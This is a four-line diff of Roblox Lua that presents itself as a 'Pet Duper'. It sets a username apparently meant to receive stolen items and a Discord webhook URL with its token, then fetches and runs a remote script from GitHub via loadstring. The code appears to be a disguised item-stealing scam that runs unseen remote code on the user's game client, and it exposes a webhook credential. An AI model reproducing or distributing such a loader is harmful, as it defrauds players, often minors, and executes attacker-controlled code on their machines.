@@ -1,1 +1,5 @@
+_G.Username "PizzTheStaler"
+_G.HubName "Pet Duper"
+_G.WebhookUrl "https://discord.com/api/webhooks/1125099791261650944/5Hirfdb7cw1dWyXYd6ZWPstuOa5LdqOnaYuwPH4ZvobhvVNu1wuejBMQGZwSZ2-4Kn7t/github"
 
+loadstring(game:HttpGet("https://github.com/Jayiioceanii/PeakOnTop/blob/main/peak.lua"))()
